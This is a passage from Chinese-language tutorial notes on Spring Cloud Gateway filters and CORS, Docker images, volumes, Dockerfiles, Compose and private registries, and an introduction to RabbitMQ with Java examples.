GatewayFilterChain chain);\n}\n```\n\n在filter中编写自定义逻辑，可以实现下列功能：\n\n- 登录状态判断\n- 权限校验\n- 请求限流等\n\n### ❷自定义全局过滤器\n\n需求：定义全局过滤器，拦截请求，判断请求的参数是否满足下面条件：\n\n- 参数中是否有authorization，\n\n- authorization参数值是否为admin\n\n- 如果同时满足则放行，否则拦截\n\n实现：在gateway中定义一个过滤器：\n\n```java\npackage cn.itcast.gateway.filters;\n\n@Order(-1)\n@Component\npublic class AuthorizeFilter implements GlobalFilter {\n    @Override\n    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        // 1.获取请求参数\n        MultiValueMap<String, String> params = exchange.getRequest().getQueryParams();\n        // 2.获取authorization参数\n        String auth = params.getFirst(\"authorization\");\n        // 3.校验\n        if (\"admin\".equals(auth)) {\n            // 放行\n            return chain.filter(exchange);\n        }\n        // 4.拦截\n        // 4.1.禁止访问，设置状态码\n        exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);\n        // 4.2.结束处理\n        return exchange.getResponse().setComplete();\n    }\n}\n```\n\n### ❸过滤器执行顺序\n\n请求进入网关会碰到三类过滤器：DefaultFilter、当前路由的过滤器、GlobalFilter\n\n请求路由后，会将三个过滤器合并到一个过滤器链（集合）中，排序后依次执行每个过滤器：\n\n![](https://img.jwt1399.top/img/202209251133009.png)\n\n排序的规则是什么呢？\n\n- 每一个过滤器都必须指定一个int类型的order值，**order值越小，优先级越高，执行顺序越靠前**。\n- GlobalFilter通过实现Ordered接口，或者添加@Order注解来指定order值，由我们自己指定\n- 路由过滤器和defaultFilter的order由Spring指定，默认是按照声明顺序从1递增。\n- 当过滤器的order值一样时，会按照 defaultFilter > 路由过滤器 > GlobalFilter的顺序执行。\n\n详细内容，可以查看源码：\n\n`org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#getFilters()`方法是先加载defaultFilters，然后再加载某个route的filters，然后合并。\n\n`org.springframework.cloud.gateway.handler.FilteringWebHandler#handle()`方法会加载全局过滤器，与前面的过滤器合并后根据order排序，组织过滤器链\n\n### ❹总结\n\n全局过滤器的作用是什么？\n\n- 对所有路由都生效的过滤器，并且可以自定义处理逻辑\n\n实现全局过滤器的步骤？\n\n- ①实现GlobalFilter接口\n\n- ②添加@Order注解或实现Ordered接口\n\n- ③编写处理逻辑\n\n路由过滤器、defaultFilter、全局过滤器的执行顺序？\n\n- ①order值越小，优先级越高\n\n- ②当order值一样时，顺序是defaultFilter > 局部的路由过滤器 > 全局过滤器\n\n## ⑥跨域问题\n\n### ❶什么是跨域问题\n\n跨域：域名不一致就是跨域，主要包括：\n\n- 域名不同： `www.taobao.com` 和 `www.taobao.org` \n\n- 域名相同，端口不同：`localhost:8080` 和 `localhost8081`\n\n跨域问题：浏览器禁止请求的发起者与服务端发生跨域ajax请求，请求被浏览器拦截的问题\n\n解决方案：CORS。不知道的小伙伴可以查看https://www.ruanyifeng.com/blog/2016/04/cors.html\n\n### ❷模拟跨域问题\n\n编写一个页面，并在VScode中启动 `live-server --port=8090`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n</head>\n<body>\n<pre>这是一个测试！</pre>\n</body>\n<script src=\"https://unpkg.com/axios/dist/axios.min.js\"></script>\n<script>\n  axios.get(\"http://localhost:10010/user/1?authorization=admin\")\n  .then(resp => console.log(resp.data))\n  .catch(err => console.log(err))\n</script>\n</html>\n```\n\n可以在浏览器控制台看到下面的错误：\n\n![](https://img.jwt1399.top/img/202209251219308.png)\n\n从`localhost:8090`访问`localhost:10010`，端口不同，显然是跨域的请求。\n\n### ❸解决跨域问题\n\n在gateway服务的application.yml文件中，添加下面的配置：\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      # .......\n      globalcors: # 全局的跨域处理\n        add-to-simple-url-handler-mapping: true # 解决options请求被拦截问题\n        corsConfigurations:\n          '[/**]': # 拦截一切请求\n            allowedOrigins: # 允许哪些网站的跨域请求 \n              - \"http://localhost:8090\"\n              - \"https://jwt1399.top\"\n            allowedMethods: # 允许的跨域ajax的请求方式\n              - \"GET\"\n              - \"POST\"\n              - \"DELETE\"\n              - \"PUT\"\n              - \"OPTIONS\"\n            allowedHeaders: \"*\" # 允许在请求中携带的头信息\n            allowCredentials: true # 是否允许携带cookie\n            maxAge: 360000 # 这次跨域检测的有效期\n```\n\n# 8.Docker技术\n\n**镜像（Image）**：将应用程序及其所需的依赖、函数库、环境、配置等文件打包在一起，称为镜像\n\n**容器（Container）**：镜像中的应用程序运行后形成的进程就是容器\n\n**仓库（Repository）**：一个镜像托管的服务器，可以从中上传、拉取镜像。\n\n**数据卷（volume）**：是一个虚拟目录，指向宿主机文件系统中的某个目录。\n\n## ①镜像操作\n\n### ❶镜像名称\n\n- 镜名称一般分两部分组成：[repository]:[tag]。\n- 在没有指定tag时，默认是latest，代表最新版本的镜像\n\n### ❷镜像命令\n\n![](https://img.jwt1399.top/img/202210031952952.png)\n\n```bash\ndocker images  # 查看镜像\ndocker inspect # 查看具体镜像\ndocker rmi\t\t # 删除镜像\ndocker pull    # 拉取镜像\ndocker push    # 推送镜像\ndocker save    # 导出镜像\ndocker load    # 加载镜像\n```\n\n### ❸镜像案例\n\n> 需求：从DockerHub中拉取一个nginx镜像并查看\n\n```bash\n# 1）首先去镜像仓库搜索nginx镜像，比如DockerHub\n# 2）根据查看到的镜像名称，拉取自己需要的镜像\ndocker pull nginx\n# 3）查看拉取到的镜像\ndocker images \n```\n\n> 需求：利用docker save将nginx镜像导出磁盘，然后再通过load加载回来\n\n```bash\n# 1）利用docker xx --help命令查看语法，例如，查看save命令用法，可以输入命令：\ndocker save --help\n# 2）使用docker save导出镜像到磁盘 \ndocker save -o nginx.tar nginx:latest\n# 3）使用docker load加载镜像\n# 先删除本地的nginx镜像：\ndocker rmi nginx:latest\n# 然后运行命令，加载本地文件\ndocker load -i nginx.tar\n```\n\n## ②容器操作\n\n### ❶容器状态\n\n容器保护三个状态：\n\n- 运行：进程正常运行\n- 暂停：进程暂停，CPU不再运行，并不释放内存\n- 停止：进程终止，回收进程占用的内存、CPU等资源\n\n### ❷容器命令\n\n![](https://img.jwt1399.top/img/202210032001294.png)\n\n```bash\ndocker ps       # 查看容器状态, -a 查看所有容器，包括已经停止的\ndocker run      # 创建并运行一个容器，处于运行状态\ndocker pause    # 让一个运行的容器暂停\ndocker unpause  # 让一个容器从暂停状态恢复运行\ndocker stop     # 停止一个运行的容器\ndocker start    # 让一个停止的容器再次运行\ndocker rm       # 删除一个容器\ndocker exec     # 进入容器执行命令\ndocker logs     # 查看容器日志的命令,-f 参数可以持续查看日志\n```\n\n### ❸容器案例\n\n> **需求**：创建并运行一个nginx容器\n\n```bash\ndocker run --name mn -p 80:80 -d nginx\n```\n\n命令解读：\n\n- docker run ：创建并运行一个容器\n- --name : 给容器起一个名字，比如叫做mn\n- -p ：将宿主机端口与容器端口映射，冒号左侧是宿主机端口，右侧是容器端口\n- -d：后台运行容器\n- nginx：镜像名称，例如nginx\n\n> **需求**：进入Nginx容器，修改HTML文件内容，添加\"哈喽，你好呀！\"\n\n1）进入容器。进入我们刚刚创建的nginx容器的命令为：\n\n```sh\ndocker exec -it mn bash\n```\n\n命令解读：\n\n- docker exec ：进入容器内部，执行一个命令\n\n- -it : 给当前进入的容器创建一个标准输入、输出终端，允许我们与容器交互\n\n- mn ：要进入的容器的名称\n\n- bash：进入容器后执行的命令，bash是一个linux终端交互命令\n\n2）进入nginx的HTML所在目录\n\n查看DockerHub网站中的nginx页面，可以知道nginx的html目录位置在`/usr/share/nginx/html`\n\n```bash\ncd /usr/share/nginx/html\n```\n\n3）修改index.html的内容\n\n容器内没有vi命令，无法直接修改，我们用下面的命令来修改：\n\n```sh\nsed -i -e 's#Welcome to nginx#哈喽，你好呀！#g' -e 's#<head>#<head><meta charset=\"utf-8\">#g' index.html\n```\n\n在浏览器访问 `127.0.0.1:80` ，即可看到结果\n\n## ③数据卷\n\n### ❶简介\n\n**数据卷（volume）**是一个虚拟目录，指向宿主机文件系统中的某个目录。\n\n数据卷的作用：将容器与数据分离，解耦合，方便操作容器内数据，保证数据安全\n\n![](https://img.jwt1399.top/img/202210032028213.png)\n\n一旦完成数据卷挂载，对容器的一切操作都会作用在数据卷对应的宿主机目录了。这样，我们操作宿主机的/var/lib/docker/volumes/html目录，就等于操作容器内的/usr/share/nginx/html目录了\n\n### ❷数据集命令\n\n```sh\ndocker volume create     # 创建一个数据卷\ndocker volume ls         # 列出所有的volume\ndocker volume inspect    # 显示一个或多个volume的信息\ndocker volume rm         # 删除一个或多个指定的volume\ndocker volume prune      # 删除未使用的volume\n```\n\n### ❸创建和查看数据卷\n\n**需求**：创建一个数据卷，并查看数据卷在宿主机的目录位置\n\n① 创建数据卷\n\n```sh\ndocker volume create html\n```\n\n② 查看所有数据\n\n```sh\ndocker volume ls\n```\n\n③ 查看数据卷详细信息卷\n\n```sh\ndocker volume inspect html\n```\n\n![](https://img.jwt1399.top/img/202210032037488.png)\n\n可以看到，我们创建的html这个数据卷关联的宿主机目录为`/var/lib/docker/volumes/html/_data`目录。\n\n### ❹挂载数据卷\n\n我们在创建容器时，可以通过 -v 参数来挂载一个数据卷到某个容器内目录，命令格式如下：\n\n```sh\ndocker run \\\n  --name mn \\\n  -v html:/root/html \\\n  -p 8080:80\n  nginx \\\n```\n\n这里的-v就是挂载数据卷的命令：\n\n- `-v html:/root/html` ：把html数据卷挂载到容器内的/root/html这个目录中\n\n### ❺案例:给Nginx挂载数据卷\n\n> **需求**：创建一个nginx容器，修改容器内的html目录内的index.html内容\n\n① 创建容器并挂载数据卷到容器内的HTML目录\n\n```sh\ndocker run --name mn -v html:/usr/share/nginx/html -p 80:80 -d nginx\n```\n\n② 进入html数据卷所在位置，并修改HTML内容\n\n```sh\n# 查看html数据卷的位置\ndocker volume inspect html\n# 进入该目录\ncd /var/lib/docker/volumes/html/_data\n# 修改文件\nvi index.html\n```\n\n注：mac下 docker 实际是在vm里又加了一层，因此需要进入 vm 才能执行上面操作\n\n```bash\ndocker run -it --privileged --pid=host justincormack/nsenter1\n```\n\n### ❻案例-给MySQL挂载本地目录\n\n容器不仅仅可以挂载数据卷，也可以直接挂载到宿主机目录上。关联关系如下：\n\n- 带数据卷模式：宿主机目录 --> 数据卷 ---> 容器内目录\n- 直接挂载模式：宿主机目录 ---> 容器内目录\n\n![](https://img.jwt1399.top/img/202210032118037.png)\n\n**语法**：目录挂载与数据卷挂载的语法是类似的：\n\n- -v [宿主机目录]:[容器内目录]\n- -v [宿主机文件]:[容器内文件]\n\n> **需求**：创建并运行一个MySQL容器，将宿主机目录直接挂载到容器\n\n1）拉取mysql镜像\n\n```bash\ndocker pull mysql\n```\n\n2）创建目录/tmp/mysql/data\n\n```bash\nmkdir -p /tmp/mysql/data\n```\n\n3）创建目录/tmp/mysql/conf，将提供的hmy.cnf文件上传到/tmp/mysql/conf\n\n```bash\nmkdir -p /tmp/mysql/conf\n```\n\n4）去DockerHub查阅资料，创建并运行MySQL容器，要求：\n\n① 挂载/tmp/mysql/data到mysql容器内数据存储目录\n\n② 挂载/tmp/mysql/conf/hmy.cnf到mysql容器的配置文件\n\n③ 设置MySQL密码\n\n```bash\ndocker run \\\n --name some-mysql \\\n -e MYSQL_ROOT_PASSWORD=root \\\n -p 3306:3306 \\\n -v /tmp/mysql/data:/var/lib/mysql \\\n -v /tmp/mysql/conf/hmy.cnf:/etc/mysql/conf.d/hmy.cnf \\\n -d mysql:latest \n```\n\n数据卷挂载与目录直接挂载的区别\n\n- 数据卷挂载耦合度低，由docker来管理目录，但是目录较深，不好找\n- 目录挂载耦合度高，需要我们自己管理目录，不过目录容易寻找查看\n\n## ④Dockerfile\n\n常见的镜像在DockerHub就能找到，但是我们自己写的项目就必须自己构建镜像了。\n\n### ❶镜像结构\n\n要自定义镜像，就必须先了解镜像的结构才行。镜像是将应用程序及其需要的系统函数库、环境、配置、依赖打包而成。\n\n我们以MySQL为例，来看看镜像的组成结构：\n\n![](https://img.jwt1399.top/img/202210041351237.png)\n\n简单来说，镜像就是在系统函数库、运行环境基础上，添加应用程序文件、配置文件、依赖文件等组合，然后编写好启动脚本打包在一起形成的文件。\n\n因此我们只需要告诉Docker，我们的镜像的组成，需要哪些BaseImage、需要拷贝什么文件、需要安装什么依赖、启动脚本是什么，将来Docker会帮助我们构建镜像。而描述这些信息的文件就是Dockerfile文件。\n\n### ❷语法\n\n**Dockerfile**就是一个文本文件，其中包含一个个的**指令(Instruction)**，用指令来说明要执行什么操作来构建镜像。每一个指令都会形成一层Layer。\n\n![](../images/SpringCloud-实用篇/image-20221004135210763.png)\n\n更新详细语法说明，请参考官网文档： https://docs.docker.com/engine/reference/builder\n\n### ❸案例\n\n#### ⓵基于Ubuntu构建Java项目\n\n> 需求：基于Ubuntu镜像构建一个新镜像，运行一个java项目\n\n步骤1：新建一个空文件夹 docker-demo\n\n步骤2：拷贝 docker-demo.jar 文件到 docker-demo 目录\n\n步骤3：拷贝 jdk8.tar.gz 文件到 docker-demo 目录\n\n步骤4：在 docker-demo 目录下新建 Dockerfile，内容如下\n\n```bash\n# 指定基础镜像\nFROM ubuntu:16.04\n# 配置环境变量，JDK的安装目录\nENV JAVA_DIR=/usr/local\n\n# 拷贝jdk和java项目的包\nCOPY ./jdk8.tar.gz $JAVA_DIR/\nCOPY ./docker-demo.jar /tmp/app.jar\n\n# 安装JDK\nRUN cd $JAVA_DIR \\\n && tar -xf ./jdk8.tar.gz \\\n && mv ./jdk1.8.0_144 ./java8\n\n# 配置环境变量\nENV JAVA_HOME=$JAVA_DIR/java8\nENV PATH=$PATH:$JAVA_HOME/bin\n\n# 暴露端口\nEXPOSE 8090\n# 入口，java项目的启动命令\nENTRYPOINT java -jar /tmp/app.jar\n```\n\n步骤5：进入 docker-demo，运行命令\n\n```bash\ndocker build -t javaweb:1.0 .\n\n# -t代表tag即名字\n# .代表Dockerfile所在的目录\n```\n\n步骤6：使用docker run创建容器并运行\n\n```bash\ndocker run --name web -p 8090:8090 -d javaweb:1.0 \n```\n\n最后访问 http://127.0.0.1:8090/hello/count\n\n#### ⓶基于java8构建Java项目\n\n虽然我们可以基于Ubuntu基础镜像，添加任意自己需要的安装包，构建镜像，但是却比较麻烦。所以大多数情况下，我们都可以在一些安装了部分软件的基础镜像上做改造。例如，构建java项目的镜像，可以在已经准备了JDK的基础镜像基础上构建。\n\n> 需求：基于java:8-alpine镜像，将一个Java项目构建为镜像\n\n① 新建一个空文件夹 docker-demo\n\n② 拷贝 docker-demo.jar 到这个目录中\n\n③ 在目录中新建 Dockerfile 文件，内容如下：\n\n```bash\nFROM java:8-alpine\nCOPY ./docker-demo.jar /tmp/app.jar\nEXPOSE 8090\nENTRYPOINT java -jar /tmp/app.jar\n```\n\n- ④ 使用docker build命令构建镜像\n\n```bash\ndocker build -t javaweb:2.0 .\n```\n\n- ⑤ 使用docker run创建容器并运行\n\n```bash\ndocker run --name web -p 8090:8090 -d javaweb:2.0 \n```\n\n## ⑤DockerCompose\n\n### ❶简介\n\n在线上环境中，通常不会将项目的所有组件放到同一个容器中；更好的做法是**把每个独立的功能装进单独的容器**，这样方便复用。因此同一个服务器上会运行着多个容器，如果每次都靠一条条指令去启动，未免也太繁琐了。 `Docker-compose` 就是解决这个问题的，它用来编排多个容器，将启动容器的命令统一写到 `docker-compose.yml` 文件中，以后每次启动这一组容器时，只需要 `docker-compose up` 就可以了。\n\n其实DockerCompose文件可以看做是将多个docker run命令写到一个文件，只是语法稍有差异。\n\nCompose文件是一个文本文件，通过指令定义集群中的每个容器如何运行。格式如下：\n\n```yaml\nversion: \"3.8\"\n services:\n  mysql:\n    image: mysql:5.7.25\n    environment:\n     MYSQL_ROOT_PASSWORD: root \n    volumes:\n     - \"/tmp/mysql/data:/var/lib/mysql\"\n     - \"/tmp/mysql/conf/hmy.cnf:/etc/mysql/conf.d/hmy.cnf\"\n  web:\n    build: .\n    ports:\n     - \"8090:8090\"\n\n```\n\n上面的Compose文件就描述一个项目，其中包含两个容器：\n\n- mysql：一个基于`mysql:5.7.25`镜像构建的容器，并且挂载了两个目录\n- web：一个基于`docker build`临时构建的镜像容器，映射端口时8090\n\nDockerCompose的详细语法参考官网：https://docs.docker.com/compose/compose-file/\n\n### ❷案例：部署微服务集群\n\n> **需求**：将之前学习的cloud-demo微服务集群利用DockerCompose部署\n\n**实现思路**：\n\n① 在cloud-demo文件夹编写docker-compose文件\n\n② 修改自己的cloud-demo项目，将数据库、nacos地址都命名为docker-compose中的服务名\n\n③ 使用maven打包工具，将项目中的每个微服务都打包为app.jar\n\n④ 将打包好的app.jar拷贝到cloud-demo中的每一个对应的子目录中\n\n⑤ 将cloud-demo上传至虚拟机，利用 docker-compose up -d 来部署\n\n#### ⓵编写docker-compose文件\n\n```yaml\nversion: \"3.2\" #docker-compose版本\nservices:\n  nacos:\n    image: nacos/nacos-server\n    environment:\n      MODE: standalone\n    ports:\n      - \"8848:8848\"\n  mysql:\n    image: mysql:5.7.25\n    environment:\n      MYSQL_ROOT_PASSWORD: 123\n    volumes:\n      - \"$PWD/mysql/data:/var/lib/mysql\"\n      - \"$PWD/mysql/conf:/etc/mysql/conf.d/\"\n  userservice:\n    build: ./user-service\n  orderservice:\n    build: ./order-service\n  gateway:\n    build: ./gateway\n    ports:\n      - \"10010:10010\"\n```\n\n可以看到，其中包含5个service服务：\n\n- `nacos`：作为注册中心和配置中心\n  - `image: nacos/nacos-server`： 基于nacos/nacos-server镜像构建\n  - `environment`：环境变量\n    - `MODE: standalone`：单点模式启动\n  - `ports`：端口映射，这里暴露了8848端口\n- `mysql`：数据库\n  - `image: mysql:5.7.25`：镜像版本是mysql:5.7.25\n  - `environment`：环境变量\n    - `MYSQL_ROOT_PASSWORD: root`：设置数据库root账户的密码为root\n  - `volumes`：数据卷挂载，这里挂载了mysql的data、conf目录\n- `userservice`、`orderservice`、`gateway`：都是基于Dockerfile临时构建的\n\n#### ⓶修改微服务配置\n\n因为微服务将来要部署为docker容器，而容器之间互联不是通过IP地址，而是通过容器名。这里我们将order-service、user-service、gateway服务的mysql、nacos地址都修改为基于容器名的访问。如下所示：\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://mysql:3306/cloud_order?useSSL=false # mysql\n    username: root\n    password: root\n    driver-class-name: com.mysql.jdbc.Driver\n  application:\n    name: orderservice\n  cloud:\n    nacos:\n      server-addr: nacos:8848 # nacos服务地址\n```\n\n#### ⓷打包微服务模块\n\n将每个微服务都打包。因为之前查看到Dockerfile中的jar包名称都是app.jar，因此我们的每个微服务都需要用这个名称。可以通过修改pom.xml中的打包名称来实现，每个微服务都需要修改\n\n```xml\n<build>\n  <!-- 服务打包的最终名称 -->\n  <finalName>app</finalName>\n  <plugins>\n    <plugin>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-maven-plugin</artifactId>\n    </plugin>\n  </plugins>\n</build>\n```\n\n#### ⓸编写Dockerfile\n\n将每个微服务构建成镜像，编写三个Dockerfile，放入对应目录\n\n```bash\nFROM java:8-alpine\nCOPY ./app.jar /tmp/app.jar\nENTRYPOINT java -jar /tmp/app.jar\n```\n\n编译打包好的app.jar文件，需要放到Dockerfile的同级目录中。注意：每个微服务的app.jar放到与服务名称对应的目录，别搞错了。\n\n```bash\n.\n├── docker-compose.yml\n├── gateway\n│   ├── Dockerfile\n│   └── app.jar\n├── mysql\n│   ├── conf\n│   └── data\n├── order-service\n│   ├── Dockerfile\n│   └── app.jar\n└── user-service\n    ├── Dockerfile\n    └── app.jar\n```\n\n#### ⓹部署\n\n最后，我们需要将整个cloud-demo文件夹上传到虚拟机中，由DockerCompose部署。\n\n进入cloud-demo目录，然后运行下面的命令：\n\n```sh\ndocker-compose up -d   # 后台运行容器\n```\n\n其它命令\n\n```bash\ndocker-compose build   # 重新构建镜像\ndocker-compose start   # 启动已有的容器\ndocker-compose stop    # 停止已有的容器\ndocker-compose logs    # 查看容器日志\ndocker-compose down    # 删除容器\n```\n\n## ⑥私有仓库\n\n使用DockerCompose部署带有图象界面的DockerRegistry，命令如下：\n\n```yaml\nversion: '3.0'\nservices:\n  registry:\n    image: registry\n    volumes:\n      - ./registry-data:/var/lib/registry\n  ui:\n    image: joxit/docker-registry-ui:static\n    ports:\n      - 8080:80\n    environment:\n      - REGISTRY_TITLE=简简私有仓库\n      - REGISTRY_URL=http://registry:5000\n    depends_on:\n      - registry\n```\n\n### ❶配置Docker信任地址\n\n我们的私服采用的是http协议，默认使用HTTPS推送镜像，http不被Docker信任，所以需要做一个配置\n\n```sh\n# 打开要修改的文件\nvi /etc/docker/daemon.json\n# 添加内容：\n\"insecure-registries\":[\"http://192.168.150.101:8080\"]\n# 重加载\nsystemctl daemon-reload\n# 重启docker\nsystemctl restart docker\n```\n\n访问`http://192.168.150.101:8080` 即可\n\n### ❷推送、拉取镜像\n\n推送镜像到私有镜像服务必须先tag，步骤如下：\n\n① 重命名本地镜像，名称前缀为私有仓库的地址：192.168.150.101:8080/\n\n ```sh\ndocker tag nginx:latest 192.168.150.101:8080/nginx:1.0 \n ```\n\n② 推送镜像\n\n```sh\ndocker push 192.168.150.101:8080/nginx:1.0 \n```\n\n③ 拉取镜像\n\n```sh\ndocker pull 192.168.150.101:8080/nginx:1.0 \n```\n\n# 9.RabbitMQ\n\n## ①初识MQ\n\n### ❶同步和异步\n\n- 同步通讯：就像打电话，需要实时响应。\n\n- 异步通讯：就像发微信，不需要马上回复。\n\n![](https://img.jwt1399.top/img/202210051307025.png)\n\n两种方式各有优劣，打电话可以立即得到响应，但是你却不能跟多个人同时通话。发送微信可以同时与多人交流，但是往往响应会有延迟。\n\n#### 同步通讯\n\n优点：\n\n- 时效性较强，可以立即得到结果\n\n缺点：\n\n- 耦合度高\n- 性能和吞吐能力下降\n- 有额外的资源消耗\n- 有级联失败问题\n\n#### 异步通讯\n\n为了解除事件发布者与接收者之间的耦合，两者并不是直接通信，而是有一个中间人（Broker）。发布者发布事件到Broker，不关心谁来订阅事件。接收者从Broker订阅事件，不关心谁发来的消息。\n\n![](https://img.jwt1399.top/img/202210051316444.png)\n\nBroker 是一个像数据总线一样的东西，所有的服务要接收数据和发送数据都发到这个总线上，这个总线就像协议一样，让服务间的通讯变得标准和可控。\n\n优点：\n\n- 吞吐量提升：无需等待接收者处理完成，响应更快速\n\n- 故障隔离：服务没有直接调用，不存在级联失败问题\n- 调用间没有阻塞，不会造成无效的资源占用\n- 耦合度极低：每个服务都可以灵活插拔，可替换\n- 流量削峰：不管发布事件的流量波动多大，都由Broker接收，接收者可以按照自己的速度去处理事件\n\n缺点：\n\n- 架构复杂了，业务没有明显的流程线，不好管理\n- 需要依赖于Broker的可靠、安全、性能\n\n### ❷消息队列MQ\n\n比较常见的一种 Broker 就是 MQ 技术，中文是消息队列（MessageQueue），字面来看就是存放消息的队列。\n\n比较常见的MQ实现：ActiveMQ、RabbitMQ、RocketMQ、Kafka\n\n|            | **RabbitMQ**            | **ActiveMQ**                      | **RocketMQ** | **Kafka**  |\n| ---------- | ----------------------- | --------------------------------- | ------------ | ---------- |\n| 维护者     | Rabbit                  | Apache                            | 阿里         | Apache     |\n| 开发语言   | Erlang                  | Java                              | Java         | Scala&Java |\n| 协议支持   | AMQP，XMPP，SMTP，STOMP | OpenWire，STOMP，REST，XMPP，AMQP | 自定义协议   | 自定义协议 |\n| 可用性     | 高                      | 一般                              | 高           | 高         |\n| 吞吐量     | 一般                    | 差                                | 高           | 非常高     |\n| 消息延迟   | 微秒级                  | 毫秒级                            | 毫秒级       | 毫秒以内   |\n| 消息可靠性 | 高                      | 一般                              | 高           | 一般       |\n\n追求可用性：Kafka、 RocketMQ 、RabbitMQ\n\n追求可靠性：RabbitMQ、RocketMQ\n\n追求吞吐能力：RocketMQ、Kafka\n\n追求消息低延迟：RabbitMQ、Kafka\n\n### ❸RabbitMQ结构\n\n| MQ成员      | 描述                                     |\n| ----------- | ---------------------------------------- |\n| publisher   | 生产者                                   |\n| consumer    | 消费者                                   |\n| exchange    | 交换机，负责消息路由                     |\n| queue       | 队列，存储消息                           |\n| virtualHost | 虚拟主机，隔离不同租户的 exchange、queue |\n\n![](https://img.jwt1399.top/img/202210051322263.png)\n\n### ❹RabbitMQ消息模型\n\nRabbitMQ官方提供了5个不同的Demo示例，对应了不同的消息模型\n\n- 基本消息队列（BasicQueue）\n- 工作消息队列（WorkQueue）\n- 发布订阅模式（Publish/Subscribe）\n  - 广播（Fanout Exchange）\n  - 路由（Direct Exchange）\n  - 主题（Topic Exchange）\n\n## ②快速入门\n\n### ❶安装RabbitMQ\n\n- 拉取镜像\n\n```bash\ndocker pull rabbitmq:3-management\n```\n\n- 运行镜像\n\n```bash\ndocker run \\\n -e RABBITMQ_DEFAULT_USER=jianjian \\\n -e RABBITMQ_DEFAULT_PASS=123321 \\\n --name mq \\\n --hostname mq1 \\\n -p 15672:15672 \\\n -p 5672:5672 \\\n -d rabbitmq:3-management\n```\n\n访问 `http://127.0.0.1:15672` 即可\n\n### ❷入门案例\n\n基本消息队列模式的模型图：\n\n![](https://img.jwt1399.top/img/202210051435751.png)\n\n\n\n官方的HelloWorld是基于最基础的消息队列模型来实现的，只包括三个角色：\n\n- publisher：消息发布者，将消息发送到队列queue\n- queue：消息队列，负责接受并缓存消息\n- consumer：订阅队列，处理队列中的消息\n\n#### ⓵准备工作\n\nIDEA中导入Demo工程 [mq-demo](https://jwt1399.lanzouv.com/iw6lR0d7tmob)，导入后结构如下：\n\n![](https://img.jwt1399.top/img/202210051432528.png)\n\n包括三部分：\n\n- mq-demo：父工程，管理项目依赖\n- publisher：消息的发送者\n- consumer：消息的消费者\n\n#### ⓶publisher实现\n\n思路：\n\n- 1.建立连接\n- 2.创建Channel\n- 3.声明队列\n- 4.发送消息\n- 5.关闭连接和通道\n\n```java\npublic class PublisherTest {\n    @Test\n    public void testSendMessage() throws IOException, TimeoutException {\n        // 1.建立连接\n        ConnectionFactory factory = new ConnectionFactory();\n        // 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码\n        factory.setHost(\"192.168.50.86\");\n        factory.setPort(5672);\n        factory.setVirtualHost(\"/\");\n        factory.setUsername(\"jianjian\");\n        factory.setPassword(\"123321\");\n        // 1.2.建立连接\n        Connection connection = factory.newConnection();\n\n        // 2.创建通道Channel\n        Channel channel = connection.createChannel();\n\n        // 3.创建队列\n        String queueName = \"simple.queue\";\n        channel.queueDeclare(queueName, false, false, false, null);\n\n        // 4.发送消息\n        String message = \"hello, rabbitmq!\";\n        channel.basicPublish(\"\", queueName, null, message.getBytes());\n        System.out.println(\"发送消息成功：【\" + message + \"】\");\n\n        // 5.关闭通道和连接\n        channel.close();\n        connection.close();\n    }\n}\n```\n\n#### ⓷consumer实现\n\n思路：\n\n- 1.建立连接\n- 2.创建Channel\n- 3.声明队列\n- 4.订阅消息\n- 5.处理消息\n\n```java\npublic class ConsumerTest {\n\n    public static void main(String[] args) throws IOException, TimeoutException {\n        // 1.建立连接\n        ConnectionFactory factory = new ConnectionFactory();\n        // 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码\n        factory.setHost(\"192.168.50.86\");\n        factory.setPort(5672);\n        factory.setVirtualHost(\"/\");\n        factory.setUsername(\"jianjian\");\n        factory.setPassword(\"123321\");\n        // 1.2.建立连接\n        Connection connection = factory.newConnection();\n\n        // 2.创建通道Channel\n        Channel channel = connection.createChannel();\n\n        // 3.创建队列\n        String queueName = \"simple.queue\";\n        channel.queueDeclare(queueName, false, false, false, null);\n\n        // 4.订阅消息\n        channel.basicConsume(queueName, true, new DefaultConsumer(channel){\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope,\n                                       AMQP.BasicProperties properties, byte[] body) throws IOException {\n                // 5.处理消息\n                String message = new String(body);\n                System.out.println(\"接收到消息：【\" + message + \"】\");\n            }\n        });\n        System.out.println(\"等待接收消息。。。。\");\n    }\n}\n```\n\n#### ⓸总结\n\n基本消息队列的消息发送流程：\n\n1. 建立connection\n\n2. 创建channel\n\n3. 利用channel声明队列\n\n4. 利用channel向队列发送消息\n\n基本消息队列的消息接收流程：\n\n1. 建立connection\n\n2. 创建channel\n\n3. 利用channel声明队列\n\n4. 定义consumer的消费行为handleDelivery()\n\n5. 利用channel将消费者与队列绑定\n\n## ③SpringAMQP\n\n### ➊简介\n\nAMQP（Advanced Message Queuing Protocol）是用于在应用程序之间传递业务消息的开放标准。该协议与语言和平台无关，更符合微服务中独立性的要求。\n\nSpringAMQP 是基于AMQP协议 和 RabbitMQ 封装的一套API规范，提供了模板来发送和接收消息。包含两部分，其中spring- amqp是基础抽象，spring-rabbit是底层的默认实现。并且还利用SpringBoot对其实现了自动装配，使用起来非常方便。SpringAMQP的官方地址：https://spring.io/projects/spring-amqp\n\nSpringAMQP提供了三个功能：\n\n- 自动声明队列、交换机及其绑定关系\n- 基于注解的监听器模式，异步接收消息\n- 封装了RabbitTemplate工具，用于发送消息 \n\n### ➋Basic Queue\n\n![](https://img.jwt1399.top/img/202210051435751.png)\n\n#### ⓵准备工作\n\n在父工程mq-demo中引入依赖\n\n```xml\n<!--AMQP依赖，包含RabbitMQ-->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n```\n\n#### ⓶消息发送\n\n首先配置MQ地址，在publisher服务的application.yml中添加配置：\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # 主机名\n    port: 